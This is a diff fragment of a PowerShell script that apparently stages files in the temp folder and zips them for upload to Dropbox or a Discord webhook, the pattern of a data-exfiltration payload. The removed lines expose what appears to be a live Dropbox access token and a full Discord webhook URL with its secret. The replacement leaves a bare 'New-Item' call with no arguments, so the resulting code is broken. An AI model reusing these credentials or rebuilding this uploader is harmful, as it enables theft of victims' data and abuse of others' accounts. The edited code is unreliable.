@@ -45,15 +45,7 @@ $FileName = "$FolderName.txt"
 
 $ZIP = "$FolderName.zip"
 
-New-Item -Path $env:tmp/$FolderName -ItemType Directory
-
-############################################################################################################################################################
-
-# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
-
-#$db = "sl.B2qs-Tsz9YVSk-_qwC3-NstxF6lzlEIx_g9T3GDXA4Q88Fs_jLC9zQz1IrK-eV7yn7IyvnJEd60dGeB99p68msmZigV3FStvqHZRd_U6jwTwBsZS2yYut2pDIxihks909u7VCD4Nl2Sv"
-
-#$dc = "https://discord.com/api/webhooks/1203399887870369804/3YDivde8ejGp57vJoYBzJK0RvBNWjQGJsrLONKtJU7-dygS1afW2WFbd34MJi63zOru3"
+New-Item
 
 ############################################################################################################################################################
 
